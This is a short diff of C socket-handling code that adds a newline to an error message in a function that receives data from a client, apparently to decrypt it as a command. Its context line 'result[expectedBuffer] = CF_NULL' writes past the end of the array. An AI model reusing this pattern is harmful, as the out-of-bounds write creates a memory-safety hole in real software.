@@ -106,7 +106,7 @@ void clientHandler(SOCKET clientSocket)
         char result[expectedBuffer];
         if (fetchData(&clientSocket, result) == SOCKET_ERROR)
         {
-            printf("[!] Invalid Response");
+            printf("[!] Invalid Response\n");
         }
         result[expectedBuffer] = CF_NULL;
         decrypt(command, result, expectedBuffer, expectedBuffer);
